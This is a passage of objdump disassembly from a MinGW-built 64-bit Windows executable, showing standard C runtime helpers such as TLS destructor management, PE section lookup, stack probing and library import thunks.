  407e0d:	eb 9a                	jmp    407da9 <___w64_mingwthr_add_key_dtor+0x19>
  407e0f:	90                   	nop

0000000000407e10 <___w64_mingwthr_remove_key_dtor>:
  407e10:	53                   	push   %rbx
  407e11:	48 83 ec 20          	sub    $0x20,%rsp
  407e15:	8b 05 cd 6c 02 00    	mov    0x26ccd(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407e1b:	85 c0                	test   %eax,%eax
  407e1d:	89 cb                	mov    %ecx,%ebx
  407e1f:	75 0f                	jne    407e30 <___w64_mingwthr_remove_key_dtor+0x20>
  407e21:	31 c0                	xor    %eax,%eax
  407e23:	48 83 c4 20          	add    $0x20,%rsp
  407e27:	5b                   	pop    %rbx
  407e28:	c3                   	ret
  407e29:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407e30:	48 8d 0d c9 6c 02 00 	lea    0x26cc9(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407e37:	ff 15 2f 04 04 00    	call   *0x4042f(%rip)        # 44826c <__imp_EnterCriticalSection>
  407e3d:	48 8b 05 9c 6c 02 00 	mov    0x26c9c(%rip),%rax        # 42eae0 <key_dtor_list>
  407e44:	48 85 c0             	test   %rax,%rax
  407e47:	74 1a                	je     407e63 <___w64_mingwthr_remove_key_dtor+0x53>
  407e49:	8b 10                	mov    (%rax),%edx
  407e4b:	39 d3                	cmp    %edx,%ebx
  407e4d:	75 0b                	jne    407e5a <___w64_mingwthr_remove_key_dtor+0x4a>
  407e4f:	eb 4f                	jmp    407ea0 <___w64_mingwthr_remove_key_dtor+0x90>
  407e51:	8b 11                	mov    (%rcx),%edx
  407e53:	39 da                	cmp    %ebx,%edx
  407e55:	74 29                	je     407e80 <___w64_mingwthr_remove_key_dtor+0x70>
  407e57:	48 89 c8             	mov    %rcx,%rax
  407e5a:	48 8b 48 10          	mov    0x10(%rax),%rcx
  407e5e:	48 85 c9             	test   %rcx,%rcx
  407e61:	75 ee                	jne    407e51 <___w64_mingwthr_remove_key_dtor+0x41>
  407e63:	48 8d 0d 96 6c 02 00 	lea    0x26c96(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407e6a:	ff 15 4c 04 04 00    	call   *0x4044c(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407e70:	31 c0                	xor    %eax,%eax
  407e72:	48 83 c4 20          	add    $0x20,%rsp
  407e76:	5b                   	pop    %rbx
  407e77:	c3                   	ret
  407e78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407e7f:	00 
  407e80:	48 8b 51 10          	mov    0x10(%rcx),%rdx
  407e84:	48 89 50 10          	mov    %rdx,0x10(%rax)
  407e88:	e8 7b 05 00 00       	call   408408 <free>
  407e8d:	48 8d 0d 6c 6c 02 00 	lea    0x26c6c(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407e94:	ff 15 22 04 04 00    	call   *0x40422(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407e9a:	eb d4                	jmp    407e70 <___w64_mingwthr_remove_key_dtor+0x60>
  407e9c:	0f 1f 40 00          	nopl   0x0(%rax)
  407ea0:	48 8b 50 10          	mov    0x10(%rax),%rdx
  407ea4:	48 89 c1             	mov    %rax,%rcx
  407ea7:	48 89 15 32 6c 02 00 	mov    %rdx,0x26c32(%rip)        # 42eae0 <key_dtor_list>
  407eae:	eb d8                	jmp    407e88 <___w64_mingwthr_remove_key_dtor+0x78>

0000000000407eb0 <__mingw_TLScallback>:
  407eb0:	53                   	push   %rbx
  407eb1:	48 83 ec 20          	sub    $0x20,%rsp
  407eb5:	83 fa 01             	cmp    $0x1,%edx
  407eb8:	0f 84 92 00 00 00    	je     407f50 <__mingw_TLScallback+0xa0>
  407ebe:	72 30                	jb     407ef0 <__mingw_TLScallback+0x40>
  407ec0:	83 fa 02             	cmp    $0x2,%edx
  407ec3:	74 1b                	je     407ee0 <__mingw_TLScallback+0x30>
  407ec5:	83 fa 03             	cmp    $0x3,%edx
  407ec8:	75 1b                	jne    407ee5 <__mingw_TLScallback+0x35>
  407eca:	8b 05 18 6c 02 00    	mov    0x26c18(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407ed0:	85 c0                	test   %eax,%eax
  407ed2:	74 11                	je     407ee5 <__mingw_TLScallback+0x35>
  407ed4:	e8 47 fe ff ff       	call   407d20 <__mingwthr_run_key_dtors.part.0>
  407ed9:	eb 0a                	jmp    407ee5 <__mingw_TLScallback+0x35>
  407edb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  407ee0:	e8 fb f4 ff ff       	call   4073e0 <_fpreset>
  407ee5:	b8 01 00 00 00       	mov    $0x1,%eax
  407eea:	48 83 c4 20          	add    $0x20,%rsp
  407eee:	5b                   	pop    %rbx
  407eef:	c3                   	ret
  407ef0:	8b 05 f2 6b 02 00    	mov    0x26bf2(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407ef6:	85 c0                	test   %eax,%eax
  407ef8:	0f 85 82 00 00 00    	jne    407f80 <__mingw_TLScallback+0xd0>
  407efe:	8b 05 e4 6b 02 00    	mov    0x26be4(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407f04:	83 f8 01             	cmp    $0x1,%eax
  407f07:	75 dc                	jne    407ee5 <__mingw_TLScallback+0x35>
  407f09:	48 8b 0d d0 6b 02 00 	mov    0x26bd0(%rip),%rcx        # 42eae0 <key_dtor_list>
  407f10:	48 85 c9             	test   %rcx,%rcx
  407f13:	74 11                	je     407f26 <__mingw_TLScallback+0x76>
  407f15:	48 8b 59 10          	mov    0x10(%rcx),%rbx
  407f19:	e8 ea 04 00 00       	call   408408 <free>
  407f1e:	48 85 db             	test   %rbx,%rbx
  407f21:	48 89 d9             	mov    %rbx,%rcx
  407f24:	75 ef                	jne    407f15 <__mingw_TLScallback+0x65>
  407f26:	48 8d 0d d3 6b 02 00 	lea    0x26bd3(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407f2d:	48 c7 05 a8 6b 02 00 	movq   $0x0,0x26ba8(%rip)        # 42eae0 <key_dtor_list>
  407f34:	00 00 00 00 
  407f38:	c7 05 a6 6b 02 00 00 	movl   $0x0,0x26ba6(%rip)        # 42eae8 <__mingwthr_cs_init>
  407f3f:	00 00 00 
  407f42:	ff 15 1c 03 04 00    	call   *0x4031c(%rip)        # 448264 <__IAT_start__>
  407f48:	eb 9b                	jmp    407ee5 <__mingw_TLScallback+0x35>
  407f4a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407f50:	8b 05 92 6b 02 00    	mov    0x26b92(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407f56:	85 c0                	test   %eax,%eax
  407f58:	74 16                	je     407f70 <__mingw_TLScallback+0xc0>
  407f5a:	c7 05 84 6b 02 00 01 	movl   $0x1,0x26b84(%rip)        # 42eae8 <__mingwthr_cs_init>
  407f61:	00 00 00 
  407f64:	b8 01 00 00 00       	mov    $0x1,%eax
  407f69:	48 83 c4 20          	add    $0x20,%rsp
  407f6d:	5b                   	pop    %rbx
  407f6e:	c3                   	ret
  407f6f:	90                   	nop
  407f70:	48 8d 0d 89 6b 02 00 	lea    0x26b89(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407f77:	ff 15 37 03 04 00    	call   *0x40337(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  407f7d:	eb db                	jmp    407f5a <__mingw_TLScallback+0xaa>
  407f7f:	90                   	nop
  407f80:	e8 9b fd ff ff       	call   407d20 <__mingwthr_run_key_dtors.part.0>
  407f85:	e9 74 ff ff ff       	jmp    407efe <__mingw_TLScallback+0x4e>
  407f8a:	90                   	nop
  407f8b:	90                   	nop
  407f8c:	90                   	nop
  407f8d:	90                   	nop
  407f8e:	90                   	nop
  407f8f:	90                   	nop

0000000000407f90 <_ValidateImageBase.part.0>:
  407f90:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  407f94:	48 01 c1             	add    %rax,%rcx
  407f97:	31 c0                	xor    %eax,%eax
  407f99:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
  407f9f:	74 01                	je     407fa2 <_ValidateImageBase.part.0+0x12>
  407fa1:	c3                   	ret
  407fa2:	31 c0                	xor    %eax,%eax
  407fa4:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
  407faa:	0f 94 c0             	sete   %al
  407fad:	c3                   	ret
  407fae:	66 90                	xchg   %ax,%ax

0000000000407fb0 <_ValidateImageBase>:
  407fb0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  407fb5:	74 09                	je     407fc0 <_ValidateImageBase+0x10>
  407fb7:	31 c0                	xor    %eax,%eax
  407fb9:	c3                   	ret
  407fba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407fc0:	eb ce                	jmp    407f90 <_ValidateImageBase.part.0>
  407fc2:	0f 1f 40 00          	nopl   0x0(%rax)
  407fc6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  407fcd:	00 00 00 

0000000000407fd0 <_FindPESection>:
  407fd0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  407fd4:	48 01 c1             	add    %rax,%rcx
  407fd7:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  407fdb:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  407fe0:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  407fe4:	85 c9                	test   %ecx,%ecx
  407fe6:	74 29                	je     408011 <_FindPESection+0x41>
  407fe8:	83 e9 01             	sub    $0x1,%ecx
  407feb:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  407fef:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  407ff4:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  407ff8:	49 39 d0             	cmp    %rdx,%r8
  407ffb:	4c 89 c1             	mov    %r8,%rcx
  407ffe:	77 08                	ja     408008 <_FindPESection+0x38>
  408000:	03 48 08             	add    0x8(%rax),%ecx
  408003:	48 39 d1             	cmp    %rdx,%rcx
  408006:	77 0b                	ja     408013 <_FindPESection+0x43>
  408008:	48 83 c0 28          	add    $0x28,%rax
  40800c:	4c 39 c8             	cmp    %r9,%rax
  40800f:	75 e3                	jne    407ff4 <_FindPESection+0x24>
  408011:	31 c0                	xor    %eax,%eax
  408013:	c3                   	ret
  408014:	66 90                	xchg   %ax,%ax
  408016:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40801d:	00 00 00 

0000000000408020 <_FindPESectionByName>:
  408020:	57                   	push   %rdi
  408021:	56                   	push   %rsi
  408022:	53                   	push   %rbx
  408023:	48 83 ec 20          	sub    $0x20,%rsp
  408027:	48 89 ce             	mov    %rcx,%rsi
  40802a:	e8 a9 03 00 00       	call   4083d8 <strlen>
  40802f:	48 83 f8 08          	cmp    $0x8,%rax
  408033:	77 6b                	ja     4080a0 <_FindPESectionByName+0x80>
  408035:	48 8b 15 84 9c 00 00 	mov    0x9c84(%rip),%rdx        # 411cc0 <.refptr.__image_base__>
  40803c:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  408041:	75 5d                	jne    4080a0 <_FindPESectionByName+0x80>
  408043:	48 89 d1             	mov    %rdx,%rcx
  408046:	e8 45 ff ff ff       	call   407f90 <_ValidateImageBase.part.0>
  40804b:	85 c0                	test   %eax,%eax
  40804d:	74 51                	je     4080a0 <_FindPESectionByName+0x80>
  40804f:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
  408053:	48 01 d1             	add    %rdx,%rcx
  408056:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  40805a:	48 8d 5c 01 18       	lea    0x18(%rcx,%rax,1),%rbx
  40805f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
  408063:	85 c0                	test   %eax,%eax
  408065:	74 39                	je     4080a0 <_FindPESectionByName+0x80>
  408067:	83 e8 01             	sub    $0x1,%eax
  40806a:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40806e:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
  408073:	eb 09                	jmp    40807e <_FindPESectionByName+0x5e>
  408075:	48 83 c3 28          	add    $0x28,%rbx
  408079:	48 39 fb             	cmp    %rdi,%rbx
  40807c:	74 22                	je     4080a0 <_FindPESectionByName+0x80>
  40807e:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  408084:	48 89 f2             	mov    %rsi,%rdx
  408087:	48 89 d9             	mov    %rbx,%rcx
  40808a:	e8 41 03 00 00       	call   4083d0 <strncmp>
  40808f:	85 c0                	test   %eax,%eax
  408091:	75 e2                	jne    408075 <_FindPESectionByName+0x55>
  408093:	48 89 d8             	mov    %rbx,%rax
  408096:	48 83 c4 20          	add    $0x20,%rsp
  40809a:	5b                   	pop    %rbx
  40809b:	5e                   	pop    %rsi
  40809c:	5f                   	pop    %rdi
  40809d:	c3                   	ret
  40809e:	66 90                	xchg   %ax,%ax
  4080a0:	31 db                	xor    %ebx,%ebx
  4080a2:	48 89 d8             	mov    %rbx,%rax
  4080a5:	48 83 c4 20          	add    $0x20,%rsp
  4080a9:	5b                   	pop    %rbx
  4080aa:	5e                   	pop    %rsi
  4080ab:	5f                   	pop    %rdi
  4080ac:	c3                   	ret
  4080ad:	0f 1f 00             	nopl   (%rax)

00000000004080b0 <__mingw_GetSectionForAddress>:
  4080b0:	48 83 ec 28          	sub    $0x28,%rsp
  4080b4:	4c 8b 05 05 9c 00 00 	mov    0x9c05(%rip),%r8        # 411cc0 <.refptr.__image_base__>
  4080bb:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  4080c1:	48 89 ca             	mov    %rcx,%rdx
  4080c4:	75 57                	jne    40811d <__mingw_GetSectionForAddress+0x6d>
  4080c6:	4c 89 c1             	mov    %r8,%rcx
  4080c9:	e8 c2 fe ff ff       	call   407f90 <_ValidateImageBase.part.0>
  4080ce:	85 c0                	test   %eax,%eax
  4080d0:	74 4b                	je     40811d <__mingw_GetSectionForAddress+0x6d>
  4080d2:	49 63 40 3c          	movslq 0x3c(%r8),%rax
  4080d6:	48 89 d1             	mov    %rdx,%rcx
  4080d9:	4c 29 c1             	sub    %r8,%rcx
  4080dc:	49 01 c0             	add    %rax,%r8
  4080df:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
  4080e4:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
  4080e9:	85 d2                	test   %edx,%edx
  4080eb:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
  4080f0:	74 2b                	je     40811d <__mingw_GetSectionForAddress+0x6d>
  4080f2:	83 ea 01             	sub    $0x1,%edx
  4080f5:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  4080f9:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  4080fe:	66 90                	xchg   %ax,%ax
  408100:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  408104:	4c 39 c1             	cmp    %r8,%rcx
  408107:	4c 89 c2             	mov    %r8,%rdx
  40810a:	72 08                	jb     408114 <__mingw_GetSectionForAddress+0x64>
  40810c:	03 50 08             	add    0x8(%rax),%edx
  40810f:	48 39 d1             	cmp    %rdx,%rcx
  408112:	72 0b                	jb     40811f <__mingw_GetSectionForAddress+0x6f>
  408114:	48 83 c0 28          	add    $0x28,%rax
  408118:	4c 39 c8             	cmp    %r9,%rax
  40811b:	75 e3                	jne    408100 <__mingw_GetSectionForAddress+0x50>
  40811d:	31 c0                	xor    %eax,%eax
  40811f:	48 83 c4 28          	add    $0x28,%rsp
  408123:	c3                   	ret
  408124:	66 90                	xchg   %ax,%ax
  408126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40812d:	00 00 00 

0000000000408130 <__mingw_GetSectionCount>:
  408130:	48 83 ec 28          	sub    $0x28,%rsp
  408134:	48 8b 15 85 9b 00 00 	mov    0x9b85(%rip),%rdx        # 411cc0 <.refptr.__image_base__>
  40813b:	45 31 c0             	xor    %r8d,%r8d
  40813e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  408143:	74 0b                	je     408150 <__mingw_GetSectionCount+0x20>
  408145:	44 89 c0             	mov    %r8d,%eax
  408148:	48 83 c4 28          	add    $0x28,%rsp
  40814c:	c3                   	ret
  40814d:	0f 1f 00             	nopl   (%rax)
  408150:	48 89 d1             	mov    %rdx,%rcx
  408153:	e8 38 fe ff ff       	call   407f90 <_ValidateImageBase.part.0>
  408158:	85 c0                	test   %eax,%eax
  40815a:	74 e9                	je     408145 <__mingw_GetSectionCount+0x15>
  40815c:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
  408160:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
  408166:	44 89 c0             	mov    %r8d,%eax
  408169:	48 83 c4 28          	add    $0x28,%rsp
  40816d:	c3                   	ret
  40816e:	66 90                	xchg   %ax,%ax

0000000000408170 <_FindPESectionExec>:
  408170:	48 83 ec 28          	sub    $0x28,%rsp
  408174:	4c 8b 05 45 9b 00 00 	mov    0x9b45(%rip),%r8        # 411cc0 <.refptr.__image_base__>
  40817b:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  408181:	48 89 ca             	mov    %rcx,%rdx
  408184:	75 52                	jne    4081d8 <_FindPESectionExec+0x68>
  408186:	4c 89 c1             	mov    %r8,%rcx
  408189:	e8 02 fe ff ff       	call   407f90 <_ValidateImageBase.part.0>
  40818e:	85 c0                	test   %eax,%eax
  408190:	74 46                	je     4081d8 <_FindPESectionExec+0x68>
  408192:	49 63 48 3c          	movslq 0x3c(%r8),%rcx
  408196:	4c 01 c1             	add    %r8,%rcx
  408199:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  40819d:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  4081a2:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  4081a6:	85 c9                	test   %ecx,%ecx
  4081a8:	74 2e                	je     4081d8 <_FindPESectionExec+0x68>
  4081aa:	83 e9 01             	sub    $0x1,%ecx
  4081ad:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  4081b1:	48 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%rcx
  4081b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4081bd:	00 00 00 
  4081c0:	f6 40 27 20          	testb  $0x20,0x27(%rax)
  4081c4:	74 09                	je     4081cf <_FindPESectionExec+0x5f>
  4081c6:	48 85 d2             	test   %rdx,%rdx
  4081c9:	74 0f                	je     4081da <_FindPESectionExec+0x6a>
  4081cb:	48 83 ea 01          	sub    $0x1,%rdx
  4081cf:	48 83 c0 28          	add    $0x28,%rax
  4081d3:	48 39 c8             	cmp    %rcx,%rax
  4081d6:	75 e8                	jne    4081c0 <_FindPESectionExec+0x50>
  4081d8:	31 c0                	xor    %eax,%eax
  4081da:	48 83 c4 28          	add    $0x28,%rsp
  4081de:	c3                   	ret
  4081df:	90                   	nop

00000000004081e0 <_GetPEImageBase>:
  4081e0:	48 83 ec 28          	sub    $0x28,%rsp
  4081e4:	48 8b 15 d5 9a 00 00 	mov    0x9ad5(%rip),%rdx        # 411cc0 <.refptr.__image_base__>
  4081eb:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  4081f0:	75 1e                	jne    408210 <_GetPEImageBase+0x30>
  4081f2:	48 89 d1             	mov    %rdx,%rcx
  4081f5:	e8 96 fd ff ff       	call   407f90 <_ValidateImageBase.part.0>
  4081fa:	85 c0                	test   %eax,%eax
  4081fc:	b8 00 00 00 00       	mov    $0x0,%eax
  408201:	48 0f 45 c2          	cmovne %rdx,%rax
  408205:	48 83 c4 28          	add    $0x28,%rsp
  408209:	c3                   	ret
  40820a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  408210:	31 c0                	xor    %eax,%eax
  408212:	48 83 c4 28          	add    $0x28,%rsp
  408216:	c3                   	ret
  408217:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40821e:	00 00 

0000000000408220 <_IsNonwritableInCurrentImage>:
  408220:	48 83 ec 28          	sub    $0x28,%rsp
  408224:	4c 8b 05 95 9a 00 00 	mov    0x9a95(%rip),%r8        # 411cc0 <.refptr.__image_base__>
  40822b:	31 c0                	xor    %eax,%eax
  40822d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  408233:	48 89 ca             	mov    %rcx,%rdx
  408236:	74 08                	je     408240 <_IsNonwritableInCurrentImage+0x20>
  408238:	48 83 c4 28          	add    $0x28,%rsp
  40823c:	c3                   	ret
  40823d:	0f 1f 00             	nopl   (%rax)
  408240:	4c 89 c1             	mov    %r8,%rcx
  408243:	e8 48 fd ff ff       	call   407f90 <_ValidateImageBase.part.0>
  408248:	85 c0                	test   %eax,%eax
  40824a:	74 ec                	je     408238 <_IsNonwritableInCurrentImage+0x18>
  40824c:	49 63 40 3c          	movslq 0x3c(%r8),%rax
  408250:	48 89 d1             	mov    %rdx,%rcx
  408253:	4c 29 c1             	sub    %r8,%rcx
  408256:	49 01 c0             	add    %rax,%r8
  408259:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
  40825e:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
  408263:	85 d2                	test   %edx,%edx
  408265:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
  40826a:	74 31                	je     40829d <_IsNonwritableInCurrentImage+0x7d>
  40826c:	83 ea 01             	sub    $0x1,%edx
  40826f:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  408273:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  408278:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40827f:	00 
  408280:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  408284:	4c 39 c1             	cmp    %r8,%rcx
  408287:	4c 89 c2             	mov    %r8,%rdx
  40828a:	72 08                	jb     408294 <_IsNonwritableInCurrentImage+0x74>
  40828c:	03 50 08             	add    0x8(%rax),%edx
  40828f:	48 39 d1             	cmp    %rdx,%rcx
  408292:	72 10                	jb     4082a4 <_IsNonwritableInCurrentImage+0x84>
  408294:	48 83 c0 28          	add    $0x28,%rax
  408298:	4c 39 c8             	cmp    %r9,%rax
  40829b:	75 e3                	jne    408280 <_IsNonwritableInCurrentImage+0x60>
  40829d:	31 c0                	xor    %eax,%eax
  40829f:	48 83 c4 28          	add    $0x28,%rsp
  4082a3:	c3                   	ret
  4082a4:	8b 40 24             	mov    0x24(%rax),%eax
  4082a7:	f7 d0                	not    %eax
  4082a9:	c1 e8 1f             	shr    $0x1f,%eax
  4082ac:	48 83 c4 28          	add    $0x28,%rsp
  4082b0:	c3                   	ret
  4082b1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4082b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4082bd:	00 00 00 

00000000004082c0 <__mingw_enum_import_library_names>:
  4082c0:	48 83 ec 28          	sub    $0x28,%rsp
  4082c4:	4c 8b 1d f5 99 00 00 	mov    0x99f5(%rip),%r11        # 411cc0 <.refptr.__image_base__>
  4082cb:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
  4082d1:	41 89 c9             	mov    %ecx,%r9d
  4082d4:	75 58                	jne    40832e <__mingw_enum_import_library_names+0x6e>
  4082d6:	4c 89 d9             	mov    %r11,%rcx
  4082d9:	e8 b2 fc ff ff       	call   407f90 <_ValidateImageBase.part.0>
  4082de:	85 c0                	test   %eax,%eax
  4082e0:	74 4c                	je     40832e <__mingw_enum_import_library_names+0x6e>
  4082e2:	49 63 43 3c          	movslq 0x3c(%r11),%rax
  4082e6:	4c 01 d8             	add    %r11,%rax
  4082e9:	8b 90 90 00 00 00    	mov    0x90(%rax),%edx
  4082ef:	85 d2                	test   %edx,%edx
  4082f1:	74 3b                	je     40832e <__mingw_enum_import_library_names+0x6e>
  4082f3:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
  4082f7:	48 8d 4c 08 18       	lea    0x18(%rax,%rcx,1),%rcx
  4082fc:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  408300:	85 c0                	test   %eax,%eax
  408302:	74 2a                	je     40832e <__mingw_enum_import_library_names+0x6e>
  408304:	83 e8 01             	sub    $0x1,%eax
  408307:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40830b:	48 8d 44 c1 28       	lea    0x28(%rcx,%rax,8),%rax
  408310:	44 8b 51 0c          	mov    0xc(%rcx),%r10d
  408314:	4c 39 d2             	cmp    %r10,%rdx
  408317:	4d 89 d0             	mov    %r10,%r8
  40831a:	72 09                	jb     408325 <__mingw_enum_import_library_names+0x65>
  40831c:	44 03 41 08          	add    0x8(%rcx),%r8d
  408320:	4c 39 c2             	cmp    %r8,%rdx
  408323:	72 10                	jb     408335 <__mingw_enum_import_library_names+0x75>
  408325:	48 83 c1 28          	add    $0x28,%rcx
  408329:	48 39 c1             	cmp    %rax,%rcx
  40832c:	75 e2                	jne    408310 <__mingw_enum_import_library_names+0x50>
  40832e:	31 c0                	xor    %eax,%eax
  408330:	48 83 c4 28          	add    $0x28,%rsp
  408334:	c3                   	ret
  408335:	4c 01 da             	add    %r11,%rdx
  408338:	75 0e                	jne    408348 <__mingw_enum_import_library_names+0x88>
  40833a:	eb f2                	jmp    40832e <__mingw_enum_import_library_names+0x6e>
  40833c:	0f 1f 40 00          	nopl   0x0(%rax)
  408340:	41 83 e9 01          	sub    $0x1,%r9d
  408344:	48 83 c2 14          	add    $0x14,%rdx
  408348:	8b 4a 04             	mov    0x4(%rdx),%ecx
  40834b:	85 c9                	test   %ecx,%ecx
  40834d:	75 07                	jne    408356 <__mingw_enum_import_library_names+0x96>
  40834f:	8b 42 0c             	mov    0xc(%rdx),%eax
  408352:	85 c0                	test   %eax,%eax
  408354:	74 d8                	je     40832e <__mingw_enum_import_library_names+0x6e>
  408356:	45 85 c9             	test   %r9d,%r9d
  408359:	7f e5                	jg     408340 <__mingw_enum_import_library_names+0x80>
  40835b:	8b 42 0c             	mov    0xc(%rdx),%eax
  40835e:	4c 01 d8             	add    %r11,%rax
  408361:	48 83 c4 28          	add    $0x28,%rsp
  408365:	c3                   	ret
  408366:	90                   	nop
  408367:	90                   	nop
  408368:	90                   	nop
  408369:	90                   	nop
  40836a:	90                   	nop
  40836b:	90                   	nop
  40836c:	90                   	nop
  40836d:	90                   	nop
  40836e:	90                   	nop
  40836f:	90                   	nop

0000000000408370 <___chkstk_ms>:
  408370:	51                   	push   %rcx
  408371:	50                   	push   %rax
  408372:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  408378:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  40837d:	72 19                	jb     408398 <___chkstk_ms+0x28>
  40837f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  408386:	48 83 09 00          	orq    $0x0,(%rcx)
  40838a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  408390:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  408396:	77 e7                	ja     40837f <___chkstk_ms+0xf>
  408398:	48 29 c1             	sub    %rax,%rcx
  40839b:	48 83 09 00          	orq    $0x0,(%rcx)
  40839f:	58                   	pop    %rax
  4083a0:	59                   	pop    %rcx
  4083a1:	c3                   	ret
  4083a2:	90                   	nop
  4083a3:	90                   	nop
  4083a4:	90                   	nop
  4083a5:	90                   	nop
  4083a6:	90                   	nop
  4083a7:	90                   	nop
  4083a8:	90                   	nop
  4083a9:	90                   	nop
  4083aa:	90                   	nop
  4083ab:	90                   	nop
  4083ac:	90                   	nop
  4083ad:	90                   	nop
  4083ae:	90                   	nop
  4083af:	90                   	nop

00000000004083b0 <mingw_getsp>:
  4083b0:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
  4083b5:	c3                   	ret

00000000004083b6 <longjmp>:
  4083b6:	48 8d 05 6f 00 04 00 	lea    0x4006f(%rip),%rax        # 44842c <__imp_longjmp>
  4083bd:	ff 20                	jmp    *(%rax)
  4083bf:	90                   	nop

00000000004083c0 <wcschr>:
  4083c0:	ff 25 b6 00 04 00    	jmp    *0x400b6(%rip)        # 44847c <__imp_wcschr>
  4083c6:	90                   	nop
  4083c7:	90                   	nop

00000000004083c8 <vfprintf>:
  4083c8:	ff 25 a6 00 04 00    	jmp    *0x400a6(%rip)        # 448474 <__imp_vfprintf>
  4083ce:	90                   	nop
  4083cf:	90                   	nop

00000000004083d0 <strncmp>:
  4083d0:	ff 25 96 00 04 00    	jmp    *0x40096(%rip)        # 44846c <__imp_strncmp>
  4083d6:	90                   	nop
  4083d7:	90                   	nop

00000000004083d8 <strlen>:
  4083d8:	ff 25 86 00 04 00    	jmp    *0x40086(%rip)        # 448464 <__imp_strlen>
  4083de:	90                   	nop
  4083df:	90                   	nop

00000000004083e0 <signal>:
  4083e0:	ff 25 76 00 04 00    	jmp    *0x40076(%rip)        # 44845c <__imp_signal>
  4083e6:	90                   	nop
  4083e7:	90                   	nop

00000000004083e8 <memcpy>:
  4083e8:	ff 25 5e 00 04 00    	jmp    *0x4005e(%rip)        # 44844c <__imp_memcpy>
  4083ee:	90                   	nop
  4083ef:	90                   	nop

00000000004083f0 <malloc>:
  4083f0:	ff 25 3e 00 04 00    	jmp    *0x4003e(%rip)        # 448434 <__imp_malloc>
  4083f6:	90                   	nop
  4083f7:	90                   	nop

00000000004083f8 <getenv>:
  4083f8:	ff 25 26 00 04 00    	jmp    *0x40026(%rip)        # 448424 <__imp_getenv>
  4083fe:	90                   	nop
  4083ff:	90                   	nop

